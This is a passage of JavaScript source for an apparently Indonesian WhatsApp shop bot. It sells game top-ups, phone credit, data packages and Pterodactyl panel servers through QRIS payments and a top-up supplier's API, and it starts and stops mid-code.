 *• ID :* ${sock[m.sender].idDeposit}
 *• Total Pembayaran :* Rp${await func.toRupiah(sock[m.sender].amount)}
 *• Barang :* ${Obj.nominal}
`,
        }, { quoted: sock[m.sender].msg });
 const idtrx = "sock" + `${Date.now()}`
await func.fetchJson(`https://h2h.okeconnect.com/trx?memberID=${global.IdMerchant}&product=${Obj.kode}&dest=${Obj.nodana}&refID=${idtrx}&pin=${global.pinH2H}&password=${global.passwordH2H}`)
let statuse = true
while (statuse) {
let dt = await func.fetchJson(`https://h2h.okeconnect.com/trx?memberID=${global.IdMerchant}&product=${Obj.kode}&dest=${Obj.nodana}&refID=${idtrx}&pin=${global.pinH2H}&password=${global.passwordH2H}`)
if (/status Sukses/.test(dt)) {
await sock.sendMessage(sock[m.sender].chat, {text: `
*Transaksi Telah Berhasil ✅*

 *• Nomor Tujuan :* ${Obj.nodana}
 *• Barang : ${Obj.nominal}
 *• Status :* Sukses
`, contextInfo: { isForwarded: true }}, {quoted: null})
statuse = false
break
}
await func.sleep(5000)
}
        await sock.sendMessage(sock[m.sender].chat, { delete: sock[m.sender].msg.key });

        delete sock[m.sender];
      }
    }
  } catch (err) {
    console.error("Terjadi kesalahan:", err);
 }
 }
break

case "topupml": {
  if (m.isGroup)
    return m.reply(
      "Pembelian Diamond Mobile Legends hanya bisa di dalam private chat."
    );
  if (sock[m.sender])
return m.reply(
`Masih ada transaksi yang belum diselesaikan.
      
ketik *.batalbeli* untuk membatalkan transaksi sebelumnya`
);
if (!text) return example("id dan sambungkan dengan serverid")
let idgame = text.split("|")
if (isNaN(idgame[0])) return example("id dan sambungkan dengan serverid")
  if (!args[0] || !args[0].includes("|")) {
    let nodana = idgame[0].replace(/[^0-9]/g, "").trim()
        const { data } = await axios.get("https://www.okeconnect.com/harga/json?id=905ccd028329b0a");
        let dana = data.filter(item => /TPG Diamond Mobile Legends/i.test(item.produk) && item.harga > 0)
        let sections = await dana.map((item) => {
            return {
                title: `${item.keterangan}`,
                header: `${item.produk} ✅`, 
                description: `Rp${item.harga}`, 
                id: `.topupml ${nodana}|${item.kode}|${item.harga}|${item.keterangan}`
            };
})
    return sock.sendMessage(
      m.chat,
      {
        buttons: [
          {
            buttonId: "action",
            buttonText: { displayText: "ini pesan interactiveMeta" },
            type: 4,
            nativeFlowInfo: {
              name: "single_select",
              paramsJson: JSON.stringify({
                title: "Pilih Diamond",
                sections: [
                  {
                    rows: sections, 
                  },
                ],
              }),
            },
          },
        ],
        headerType: 1,
        viewOnce: true,
        text: "\n *Pilih Jumlah Diamond 🛍️*\n",
        contextInfo: {
          isForwarded: true, 
          mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"]
        },
      },
      { quoted: null }
    );
  }

  let Obj = {};
  Obj.harga = text.split("|")[2]
  Obj.nominal = text.split("|")[3]
  Obj.kode = text.split("|")[1]
  Obj.nodana = text.split("|")[0]
  
  const amount = Number(Obj.harga) + func.generateRandomNumber(110, 250)

  try {
    const get = await axios.get(
      `https://restapi.simplebot.my.id/orderkuota/createpayment?apikey=${global.ApikeyRestApi}&amount=${amount}&codeqr=${global.QrisOrderKuota}`
    );

    const teks3 = `
 *── INFORMASI PEMBAYARAN ──*
  
 *• ID :* ${get.data.result.idtransaksi}
 *• Total Pembayaran :* Rp${await func.toRupiah(get.data.result.jumlah)}
 *• Barang :* ${Obj.nominal}
 *• ID Game :* ${Obj.nodana}
 *• Expired :* 5 menit

*Note :* 
_Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!_
`

    let msgQr = await sock.sendMessage(m.chat, {
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.imageqris.url}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender], 
   isForwarded: true
  },
})

    sock[m.sender] = {
      msg: msgQr,
      chat: m.sender,
      idDeposit: get.data.result.idtransaksi,
      amount: get.data.result.jumlah.toString(),
      status: true,
      exp: setTimeout(async () => {
        if (sock[m.sender] && sock[m.sender].status) {
          await sock.sendMessage(sock[m.sender].chat, { text: "QRIS Pembayaran Telah Expired." }, { quoted: sock[m.sender].msg });
          await sock.sendMessage(sock[m.sender].chat, { delete: sock[m.sender].msg.key })
          delete sock[m.sender];
        }
      }, 250000)
    };
    

    while (sock[m.sender] && sock[m.sender].status && sock[m.sender].amount) {
      await func.sleep(5000);
      const resultcek = await axios.get(
        `https://restapi.simplebot.my.id/orderkuota/cekstatus?apikey=${global.ApikeyRestApi}&merchant=${global.IdMerchant}&keyorkut=${global.ApikeyOrderKuota}`
      );
      const req = resultcek.data;

      if (sock[m.sender] && req?.result?.amount == sock[m.sender].amount) {
        sock[m.sender].status = false;
        clearTimeout(sock[m.sender].exp);

        await sock.sendMessage(sock[m.sender].chat, {
          text: `
*PEMBAYARAN BERHASIL ✅*

 *• ID :* ${sock[m.sender].idDeposit}
 *• Total Pembayaran :* Rp${await func.toRupiah(sock[m.sender].amount)}
 *• Barang :* ${Obj.nominal}
`,
        }, { quoted: sock[m.sender].msg });
 const idtrx = "sock" + `${Date.now()}`
await func.fetchJson(`https://h2h.okeconnect.com/trx?memberID=${global.IdMerchant}&product=${Obj.kode}&dest=${Obj.nodana}&refID=${idtrx}&pin=${global.pinH2H}&password=${global.passwordH2H}`)
let statuse = true
while (statuse) {
let dt = await func.fetchJson(`https://h2h.okeconnect.com/trx?memberID=${global.IdMerchant}&product=${Obj.kode}&dest=${Obj.nodana}&refID=${idtrx}&pin=${global.pinH2H}&password=${global.passwordH2H}`)
if (/status Sukses/.test(dt)) {
await sock.sendMessage(sock[m.sender].chat, {text: `
*Transaksi Telah Berhasil ✅*

 *• ID Game :* ${Obj.nodana}
 *• Barang : ${Obj.nominal}
 *• Status :* Sukses
`, contextInfo: { isForwarded: true }}, {quoted: null})
statuse = false
break
}
await func.sleep(5000)
}
        await sock.sendMessage(sock[m.sender].chat, { delete: sock[m.sender].msg.key });

        delete sock[m.sender];
      }
    }
  } catch (err) {
    console.error("Terjadi kesalahan:", err);
 }
 }
break

case "topupff": {
  if (m.isGroup)
    return m.reply(
      "Pembelian Diamond Mobile Legends hanya bisa di dalam private chat."
    );
  if (sock[m.sender])
return m.reply(
`Masih ada transaksi yang belum diselesaikan.
      
ketik *.batalbeli* untuk membatalkan transaksi sebelumnya`
);
if (!text) return example("idnya")
let idgame = text.split("|")
if (isNaN(idgame[0])) return example("id dan sambungkan dengan serverid")
  if (!args[0] || !args[0].includes("|")) {
    let nodana = idgame[0].replace(/[^0-9]/g, "").trim()
        const { data } = await axios.get("https://www.okeconnect.com/harga/json?id=905ccd028329b0a");
        let dana = data.filter(item => /TPG Diamond Free Fire/i.test(item.produk) && item.harga > 0)
        let sections = await dana.map((item) => {
            return {
                title: `${item.keterangan}`,
                header: `${item.produk} ✅`, 
                description: `Rp${item.harga}`, 
                id: `.topupff ${nodana}|${item.kode}|${item.harga}|${item.keterangan}`
            };
})
    return sock.sendMessage(
      m.chat,
      {
        buttons: [
          {
            buttonId: "action",
            buttonText: { displayText: "ini pesan interactiveMeta" },
            type: 4,
            nativeFlowInfo: {
              name: "single_select",
              paramsJson: JSON.stringify({
                title: "Pilih Diamond",
                sections: [
                  {
                    rows: sections, 
                  },
                ],
              }),
            },
          },
        ],
        headerType: 1,
        viewOnce: true,
        text: "\n *Pilih Jumlah Diamond 🛍️*\n",
        contextInfo: {
          isForwarded: true, 
          mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"]
        },
      },
      { quoted: null }
    );
  }

  let Obj = {};
  Obj.harga = text.split("|")[2]
  Obj.nominal = text.split("|")[3]
  Obj.kode = text.split("|")[1]
  Obj.nodana = text.split("|")[0]
  
  const amount = Number(Obj.harga) + func.generateRandomNumber(110, 250)

  try {
    const get = await axios.get(
      `https://restapi.simplebot.my.id/orderkuota/createpayment?apikey=${global.ApikeyRestApi}&amount=${amount}&codeqr=${global.QrisOrderKuota}`
    );

    const teks3 = `
 *── INFORMASI PEMBAYARAN ──*
  
 *• ID :* ${get.data.result.idtransaksi}
 *• Total Pembayaran :* Rp${await func.toRupiah(get.data.result.jumlah)}
 *• Barang :* ${Obj.nominal}
 *• ID Game :* ${Obj.nodana}
 *• Expired :* 5 menit

*Note :* 
_Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!_
`

    let msgQr = await sock.sendMessage(m.chat, {
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.imageqris.url}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender], 
   isForwarded: true
  },
})

    sock[m.sender] = {
      msg: msgQr,
      chat: m.sender,
      idDeposit: get.data.result.idtransaksi,
      amount: get.data.result.jumlah.toString(),
      status: true,
      exp: setTimeout(async () => {
        if (sock[m.sender] && sock[m.sender].status) {
          await sock.sendMessage(sock[m.sender].chat, { text: "QRIS Pembayaran Telah Expired." }, { quoted: sock[m.sender].msg });
          await sock.sendMessage(sock[m.sender].chat, { delete: sock[m.sender].msg.key })
          delete sock[m.sender];
        }
      }, 250000)
    };
    

    while (sock[m.sender] && sock[m.sender].status && sock[m.sender].amount) {
      await func.sleep(5000);
      const resultcek = await axios.get(
        `https://restapi.simplebot.my.id/orderkuota/cekstatus?apikey=${global.ApikeyRestApi}&merchant=${global.IdMerchant}&keyorkut=${global.ApikeyOrderKuota}`
      );
      const req = resultcek.data;

      if (sock[m.sender] && req?.result?.amount == sock[m.sender].amount) {
        sock[m.sender].status = false;
        clearTimeout(sock[m.sender].exp);

        await sock.sendMessage(sock[m.sender].chat, {
          text: `
*PEMBAYARAN BERHASIL ✅*

 *• ID :* ${sock[m.sender].idDeposit}
 *• Total Pembayaran :* Rp${await func.toRupiah(sock[m.sender].amount)}
 *• Barang :* ${Obj.nominal}
`,
        }, { quoted: sock[m.sender].msg });
 const idtrx = "sock" + `${Date.now()}`
await func.fetchJson(`https://h2h.okeconnect.com/trx?memberID=${global.IdMerchant}&product=${Obj.kode}&dest=${Obj.nodana}&refID=${idtrx}&pin=${global.pinH2H}&password=${global.passwordH2H}`)
let statuse = true
while (statuse) {
let dt = await func.fetchJson(`https://h2h.okeconnect.com/trx?memberID=${global.IdMerchant}&product=${Obj.kode}&dest=${Obj.nodana}&refID=${idtrx}&pin=${global.pinH2H}&password=${global.passwordH2H}`)
if (/status Sukses/.test(dt)) {
await sock.sendMessage(sock[m.sender].chat, {text: `
*Transaksi Telah Berhasil ✅*

 *• ID Game :* ${Obj.nodana}
 *• Barang : ${Obj.nominal}
 *• Status :* Sukses
`, contextInfo: { isForwarded: true }}, {quoted: null})
statuse = false
break
}
await func.sleep(5000)
}
        await sock.sendMessage(sock[m.sender].chat, { delete: sock[m.sender].msg.key });

        delete sock[m.sender];
      }
    }
  } catch (err) {
    console.error("Terjadi kesalahan:", err);
 }
 }
break

case "topuppubg": case "topuppapji": {
  if (m.isGroup)
    return m.reply(
      "Pembelian Diamond Mobile Legends hanya bisa di dalam private chat."
    );
  if (sock[m.sender])
return m.reply(
`Masih ada transaksi yang belum diselesaikan.
      
ketik *.batalbeli* untuk membatalkan transaksi sebelumnya`
);
if (!text) return example("idnya")
let idgame = text.split("|")
if (isNaN(idgame[0])) return example("id dan sambungkan dengan serverid")
  if (!args[0] || !args[0].includes("|")) {
    let nodana = idgame[0].replace(/[^0-9]/g, "").trim()
        const { data } = await axios.get("https://www.okeconnect.com/harga/json?id=905ccd028329b0a");
        let dana = data.filter(item => /TPG Game Mobile PUBG/i.test(item.produk) && item.harga > 0)
        let sections = await dana.map((item) => {
            return {
                title: `${item.keterangan}`,
                header: `${item.produk} ✅`, 
                description: `Rp${item.harga}`, 
                id: `.topuppubg ${nodana}|${item.kode}|${item.harga}|${item.keterangan}`
            };
})
    return sock.sendMessage(
      m.chat,
      {
        buttons: [
          {
            buttonId: "action",
            buttonText: { displayText: "ini pesan interactiveMeta" },
            type: 4,
            nativeFlowInfo: {
              name: "single_select",
              paramsJson: JSON.stringify({
                title: "Pilih UC",
                sections: [
                  {
                    rows: sections, 
                  },
                ],
              }),
            },
          },
        ],
        headerType: 1,
        viewOnce: true,
        text: "\n *Pilih Jumlah UC 🛍️*\n",
        contextInfo: {
          isForwarded: true, 
          mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"]
        },
      },
      { quoted: null }
    );
  }

  let Obj = {};
  Obj.harga = text.split("|")[2]
  Obj.nominal = text.split("|")[3]
  Obj.kode = text.split("|")[1]
  Obj.nodana = text.split("|")[0]
  
  const amount = Number(Obj.harga) + func.generateRandomNumber(110, 250)

  try {
    const get = await axios.get(
      `https://restapi.simplebot.my.id/orderkuota/createpayment?apikey=${global.ApikeyRestApi}&amount=${amount}&codeqr=${global.QrisOrderKuota}`
    );

    const teks3 = `
 *── INFORMASI PEMBAYARAN ──*
  
 *• ID :* ${get.data.result.idtransaksi}
 *• Total Pembayaran :* Rp${await func.toRupiah(get.data.result.jumlah)}
 *• Barang :* ${Obj.nominal}
 *• ID Game :* ${Obj.nodana}
 *• Expired :* 5 menit

*Note :* 
_Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!_
`

    let msgQr = await sock.sendMessage(m.chat, {
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.imageqris.url}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender], 
   isForwarded: true
  },
})

    sock[m.sender] = {
      msg: msgQr,
      chat: m.sender,
      idDeposit: get.data.result.idtransaksi,
      amount: get.data.result.jumlah.toString(),
      status: true,
      exp: setTimeout(async () => {
        if (sock[m.sender] && sock[m.sender].status) {
          await sock.sendMessage(sock[m.sender].chat, { text: "QRIS Pembayaran Telah Expired." }, { quoted: sock[m.sender].msg });
          await sock.sendMessage(sock[m.sender].chat, { delete: sock[m.sender].msg.key })
          delete sock[m.sender];
        }
      }, 250000)
    };
    

    while (sock[m.sender] && sock[m.sender].status && sock[m.sender].amount) {
      await func.sleep(5000);
      const resultcek = await axios.get(
        `https://restapi.simplebot.my.id/orderkuota/cekstatus?apikey=${global.ApikeyRestApi}&merchant=${global.IdMerchant}&keyorkut=${global.ApikeyOrderKuota}`
      );
      const req = resultcek.data;

      if (sock[m.sender] && req?.result?.amount == sock[m.sender].amount) {
        sock[m.sender].status = false;
        clearTimeout(sock[m.sender].exp);

        await sock.sendMessage(sock[m.sender].chat, {
          text: `
*PEMBAYARAN BERHASIL ✅*

 *• ID :* ${sock[m.sender].idDeposit}
 *• Total Pembayaran :* Rp${await func.toRupiah(sock[m.sender].amount)}
 *• Barang :* ${Obj.nominal}
`,
        }, { quoted: sock[m.sender].msg });
 const idtrx = "sock" + `${Date.now()}`
await func.fetchJson(`https://h2h.okeconnect.com/trx?memberID=${global.IdMerchant}&product=${Obj.kode}&dest=${Obj.nodana}&refID=${idtrx}&pin=${global.pinH2H}&password=${global.passwordH2H}`)
let statuse = true
while (statuse) {
let dt = await func.fetchJson(`https://h2h.okeconnect.com/trx?memberID=${global.IdMerchant}&product=${Obj.kode}&dest=${Obj.nodana}&refID=${idtrx}&pin=${global.pinH2H}&password=${global.passwordH2H}`)
if (/status Sukses/.test(dt)) {
await sock.sendMessage(sock[m.sender].chat, {text: `
*Transaksi Telah Berhasil ✅*

 *• ID Game :* ${Obj.nodana}
 *• Barang : ${Obj.nominal}
 *• Status :* Sukses
`, contextInfo: { isForwarded: true }}, {quoted: null})
statuse = false
break
}
await func.sleep(5000)
}
        await sock.sendMessage(sock[m.sender].chat, { delete: sock[m.sender].msg.key });

        delete sock[m.sender];
      }
    }
  } catch (err) {
    console.error("Terjadi kesalahan:", err);
 }
 }
break

case "buypulsa": {
  if (m.isGroup)
    return m.reply(
      "Pembelian Pulsa hanya bisa di dalam private chat."
    );
  if (sock[m.sender])
return m.reply(
`Masih ada transaksi yang belum diselesaikan.
      
ketik *.batalbeli* untuk membatalkan transaksi sebelumnya`
);
if (!text || !args[0].startsWith("08")) return example("nomornya(contoh 0838XXX)")
  if (!text.includes("|")) {
    let nodana = text.replace(/[^0-9]/g, "").trim()
    const { data } = await axios.get("https://www.okeconnect.com/harga/json?id=905ccd028329b0a");
        let dana = data.filter(item => /PULSA/i.test(item.kategori) && item.harga > 0)
        let sections = await dana.map((item) => {
            return {
                title: `${item.keterangan}`,
                header: `${item.produk} ✅`, 
                description: `Rp${item.harga}`, 
                id: `.buypulsa ${nodana}|${item.kode}|${item.harga}|${item.keterangan}`
            };
})
    return sock.sendMessage(
      m.chat,
      {
        buttons: [
          {
            buttonId: "action",
            buttonText: { displayText: "ini pesan interactiveMeta" },
            type: 4,
            nativeFlowInfo: {
              name: "single_select",
              paramsJson: JSON.stringify({
                title: "Pilih Pulsa",
                sections: [
                  {
                    rows: sections, 
                  },
                ],
              }),
            },
          },
        ],
        headerType: 1,
        viewOnce: true,
        text: "\n *Pilih Jumlah & Operator 🛍️*\n",
        contextInfo: {
          isForwarded: true, 
          mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"]
        },
      },
      { quoted: null }
    );
  }

  let Obj = {};
  Obj.harga = text.split("|")[2]
  Obj.nominal = text.split("|")[3]
  Obj.kode = text.split("|")[1]
  Obj.nodana = text.split("|")[0]
  
  const amount = Number(Obj.harga) + func.generateRandomNumber(110, 250)

  try {
    const get = await axios.get(
      `https://restapi.simplebot.my.id/orderkuota/createpayment?apikey=${global.ApikeyRestApi}&amount=${amount}&codeqr=${global.QrisOrderKuota}`
    );

    const teks3 = `
 *── INFORMASI PEMBAYARAN ──*
  
 *• ID :* ${get.data.result.idtransaksi}
 *• Total Pembayaran :* Rp${await func.toRupiah(get.data.result.jumlah)}
 *• Barang :* ${Obj.nominal}
 *• Nomor Tujuan :* ${Obj.nodana}
 *• Expired :* 5 menit

*Note :* 
_Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!_
`

    let msgQr = await sock.sendMessage(m.chat, {
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.imageqris.url}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender], 
   isForwarded: true
  },
})

    sock[m.sender] = {
      msg: msgQr,
      chat: m.sender,
      idDeposit: get.data.result.idtransaksi,
      amount: get.data.result.jumlah.toString(),
      status: true,
      exp: setTimeout(async () => {
        if (sock[m.sender] && sock[m.sender].status) {
          await sock.sendMessage(sock[m.sender].chat, { text: "QRIS Pembayaran Telah Expired." }, { quoted: sock[m.sender].msg });
          await sock.sendMessage(sock[m.sender].chat, { delete: sock[m.sender].msg.key })
          delete sock[m.sender];
        }
      }, 250000)
    };
    

    while (sock[m.sender] && sock[m.sender].status && sock[m.sender].amount) {
      await func.sleep(5000);
      const resultcek = await axios.get(
        `https://restapi.simplebot.my.id/orderkuota/cekstatus?apikey=${global.ApikeyRestApi}&merchant=${global.IdMerchant}&keyorkut=${global.ApikeyOrderKuota}`
      );
      const req = resultcek.data;

      if (sock[m.sender] && req?.result?.amount == sock[m.sender].amount) {
        sock[m.sender].status = false;
        clearTimeout(sock[m.sender].exp);

        await sock.sendMessage(sock[m.sender].chat, {
          text: `
*PEMBAYARAN BERHASIL ✅*

 *• ID :* ${sock[m.sender].idDeposit}
 *• Total Pembayaran :* Rp${await func.toRupiah(sock[m.sender].amount)}
 *• Barang :* ${Obj.nominal}
`,
        }, { quoted: sock[m.sender].msg });
 const idtrx = "sock" + `${Date.now()}`
await func.fetchJson(`https://h2h.okeconnect.com/trx?memberID=${global.IdMerchant}&product=${Obj.kode}&dest=${Obj.nodana}&refID=${idtrx}&pin=${global.pinH2H}&password=${global.passwordH2H}`)
let statuse = true
while (statuse) {
let dt = await func.fetchJson(`https://h2h.okeconnect.com/trx?memberID=${global.IdMerchant}&product=${Obj.kode}&dest=${Obj.nodana}&refID=${idtrx}&pin=${global.pinH2H}&password=${global.passwordH2H}`)
if (/status Sukses/.test(dt)) {
await sock.sendMessage(sock[m.sender].chat, {text: `
*Transaksi Telah Berhasil ✅*

 *• Nomor Tujuan :* ${Obj.nodana}
 *• Barang : ${Obj.nominal}
 *• Status :* Sukses
`, contextInfo: { isForwarded: true }}, {quoted: null})
statuse = false
break
}
await func.sleep(5000)
}
        await sock.sendMessage(sock[m.sender].chat, { delete: sock[m.sender].msg.key });

        delete sock[m.sender];
      }
    }
  } catch (err) {
    console.error("Terjadi kesalahan:", err);
 }
 }
break

case "buykuota": {
  if (m.isGroup)
    return m.reply(
      "Pembelian Pulsa hanya bisa di dalam private chat."
    );
  if (sock[m.sender])
return m.reply(
`Masih ada transaksi yang belum diselesaikan.
      
ketik *.batalbeli* untuk membatalkan transaksi sebelumnya`
);
if (!text || !args[0].startsWith("08")) return example("nomornya(contoh 0838XXX)")
  if (!text.includes("|")) {
    let nodana = text.replace(/[^0-9]/g, "").trim()
    const { data } = await axios.get("https://www.okeconnect.com/harga/json?id=905ccd028329b0a");
        let dana = data.filter(item => /KUOTA/i.test(item.kategori) && !item.keterangan.includes("Vcr") && !item.keterangan.includes("Voucher") && item.harga > 0)
        let sections = await dana.map((item) => {
            return {
                title: `${item.keterangan}`,
                header: `${item.produk} ✅`, 
                description: `Rp${item.harga}`, 
                id: `.buykuota ${nodana}|${item.kode}|${item.harga}|${item.keterangan}`
            };
})
    return sock.sendMessage(
      m.chat,
      {
        buttons: [
          {
            buttonId: "action",
            buttonText: { displayText: "ini pesan interactiveMeta" },
            type: 4,
            nativeFlowInfo: {
              name: "single_select",
              paramsJson: JSON.stringify({
                title: "Pilih Kuota",
                sections: [
                  {
                    rows: sections, 
                  },
                ],
              }),
            },
          },
        ],
        headerType: 1,
        viewOnce: true,
        text: "\n *Pilih Kuota & Operator 🛍️*\n",
        contextInfo: {
          isForwarded: true, 
          mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"]
        },
      },
      { quoted: null }
    );
  }

  let Obj = {};
  Obj.harga = text.split("|")[2]
  Obj.nominal = text.split("|")[3]
  Obj.kode = text.split("|")[1]
  Obj.nodana = text.split("|")[0]
  
  const amount = Number(Obj.harga) + func.generateRandomNumber(110, 250)

  try {
    const get = await axios.get(
      `https://restapi.simplebot.my.id/orderkuota/createpayment?apikey=${global.ApikeyRestApi}&amount=${amount}&codeqr=${global.QrisOrderKuota}`
    );

    const teks3 = `
 *── INFORMASI PEMBAYARAN ──*
  
 *• ID :* ${get.data.result.idtransaksi}
 *• Total Pembayaran :* Rp${await func.toRupiah(get.data.result.jumlah)}
 *• Barang :* ${Obj.nominal}
 *• Nomor Tujuan :* ${Obj.nodana}
 *• Expired :* 5 menit

*Note :* 
_Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!_
`

    let msgQr = await sock.sendMessage(m.chat, {
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.imageqris.url}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender], 
   isForwarded: true
  },
})

    sock[m.sender] = {
      msg: msgQr,
      chat: m.sender,
      idDeposit: get.data.result.idtransaksi,
      amount: get.data.result.jumlah.toString(),
      status: true,
      exp: setTimeout(async () => {
        if (sock[m.sender] && sock[m.sender].status) {
          await sock.sendMessage(sock[m.sender].chat, { text: "QRIS Pembayaran Telah Expired." }, { quoted: sock[m.sender].msg });
          await sock.sendMessage(sock[m.sender].chat, { delete: sock[m.sender].msg.key })
          delete sock[m.sender];
        }
      }, 250000)
    };
    

    while (sock[m.sender] && sock[m.sender].status && sock[m.sender].amount) {
      await func.sleep(5000);
      const resultcek = await axios.get(
        `https://restapi.simplebot.my.id/orderkuota/cekstatus?apikey=${global.ApikeyRestApi}&merchant=${global.IdMerchant}&keyorkut=${global.ApikeyOrderKuota}`
      );
      const req = resultcek.data;

      if (sock[m.sender] && req?.result?.amount == sock[m.sender].amount) {
        sock[m.sender].status = false;
        clearTimeout(sock[m.sender].exp);

        await sock.sendMessage(sock[m.sender].chat, {
          text: `
*PEMBAYARAN BERHASIL ✅*

 *• ID :* ${sock[m.sender].idDeposit}
 *• Total Pembayaran :* Rp${await func.toRupiah(sock[m.sender].amount)}
 *• Barang :* ${Obj.nominal}
`,
        }, { quoted: sock[m.sender].msg });
 const idtrx = "sock" + `${Date.now()}`
await func.fetchJson(`https://h2h.okeconnect.com/trx?memberID=${global.IdMerchant}&product=${Obj.kode}&dest=${Obj.nodana}&refID=${idtrx}&pin=${global.pinH2H}&password=${global.passwordH2H}`)
let statuse = true
while (statuse) {
let dt = await func.fetchJson(`https://h2h.okeconnect.com/trx?memberID=${global.IdMerchant}&product=${Obj.kode}&dest=${Obj.nodana}&refID=${idtrx}&pin=${global.pinH2H}&password=${global.passwordH2H}`)
if (/status Sukses/.test(dt)) {
await sock.sendMessage(sock[m.sender].chat, {text: `
*Transaksi Telah Berhasil ✅*

 *• Nomor Tujuan :* ${Obj.nodana}
 *• Barang : ${Obj.nominal}
 *• Status :* Sukses
`, contextInfo: { isForwarded: true }}, {quoted: null})
statuse = false
break
}
await func.sleep(5000)
}
        await sock.sendMessage(sock[m.sender].chat, { delete: sock[m.sender].msg.key });

        delete sock[m.sender];
      }
    }
  } catch (err) {
    console.error("Terjadi kesalahan:", err);
 }
 }
break

case "buypanel": {
  if (m.isGroup)
    return m.reply(
      "Pembelian Panel Pterodactyl hanya bisa di dalam private chat."
    );
  if (sock[m.sender])
return m.reply(
`Masih ada transaksi yang belum diselesaikan.
      
ketik *.batalbeli* untuk membatalkan transaksi sebelumnya`
);
if (!text) return example("username")
if (args.length > 1) return m.reply("Username dilarang menggunakan spasi.")
  if (!text.includes("|")) {
    let usn = text.toLowerCase()
    return sock.sendMessage(
      m.chat,
      {
        buttons: [
          {
            buttonId: "action",
            buttonText: { displayText: "ini pesan interactiveMeta" },
            type: 4,
            nativeFlowInfo: {
              name: "single_select",
              paramsJson: JSON.stringify({
                title: "Pilih Ram Server",
                sections: [
                  {
                    highlight_label: "Hight Quality",
                    rows: [
    { title: "Ram Unlimited ✅", description: "Rp11.000", id: `.buypanel unlimited|${usn}` },
    { title: "Ram 1GB ✅", description: "Rp1000", id: `.buypanel 1gb|${usn}` },
    { title: "Ram 2GB ✅", description: "Rp2000", id: `.buypanel 2gb|${usn}` },
    { title: "Ram 3GB ✅", description: "Rp3000", id: `.buypanel 3gb|${usn}` },
    { title: "Ram 4GB ✅", description: "Rp4000", id: `.buypanel 4gb|${usn}` },
    { title: "Ram 5GB ✅", description: "Rp5000", id: `.buypanel 5gb|${usn}` },
    { title: "Ram 6GB ✅", description: "Rp6000", id: `.buypanel 6gb|${usn}` },
    { title: "Ram 7GB ✅", description: "Rp7000", id: `.buypanel 7gb|${usn}` },
    { title: "Ram 8GB ✅", description: "Rp8000", id: `.buypanel 8gb|${usn}` },
    { title: "Ram 9GB ✅", description: "Rp9000", id: `.buypanel 9gb|${usn}` },
    { title: "Ram 10GB ✅", description: "Rp10.000", id: `.buypanel 10gb|${usn}` },
],
                  },
                ],
              }),
            },
          },
        ],
        headerType: 1,
        viewOnce: true,
        text: "\n *Pilih Ram Server Panel 🛍️*\n",
        contextInfo: {
          isForwarded: true, 
          mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"]
        },
      },
      { quoted: null }
    );
  }

  let Obj = {};
  let cmd = text.split("|")[0].toLowerCase()
  const ramOptions = {
    "1gb": { ram: "1000", disk: "1000", cpu: "40", harga: "1000" },
    "2gb": { ram: "2000", disk: "1000", cpu: "60", harga: "2000" },
    "3gb": { ram: "3000", disk: "2000", cpu: "80", harga: "3000" },
    "4gb": { ram: "4000", disk: "2000", cpu: "100", harga: "4000" },
    "5gb": { ram: "5000", disk: "3000", cpu: "120", harga: "5000" },
    "6gb": { ram: "6000", disk: "3000", cpu: "140", harga: "6000" },
    "7gb": { ram: "7000", disk: "4000", cpu: "160", harga: "7000" },
    "8gb": { ram: "8000", disk: "4000", cpu: "180", harga: "8000" },
    "9gb": { ram: "9000", disk: "5000", cpu: "200", harga: "9000" },
    "10gb": { ram: "10000", disk: "5000", cpu: "220", harga: "10000" },
    "unli": { ram: "0", disk: "0", cpu: "0", harga: "11000" },
    "unlimited": { ram: "0", disk: "0", cpu: "0", harga: "11000" },
  };

  if (!ramOptions[cmd]) return m.reply("Pilihan RAM tidak valid!");
  dts = ramOptions[cmd];
  Obj.username = text.split("|")[1]
  Obj.harga = dts.harga
  Obj.ram = dts.ram
  Obj.disk = dts.disk
  Obj.cpu = dts.cpu
  
  const amount = Number(Obj.harga) + func.generateRandomNumber(110, 250);

  try {
    const get = await axios.get(
      `https://restapi.simplebot.my.id/orderkuota/createpayment?apikey=${global.ApikeyRestApi}&amount=${amount}&codeqr=${global.QrisOrderKuota}`
    );

    const teks3 = `
 *── INFORMASI PEMBAYARAN ──*
  
 *• ID :* ${get.data.result.idtransaksi}
 *• Total Pembayaran :* Rp${await func.toRupiah(get.data.result.jumlah)}
 *• Barang :* Panel Pterodactyl
 *• Expired :* 5 menit

*Note :* 
_Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!_
`

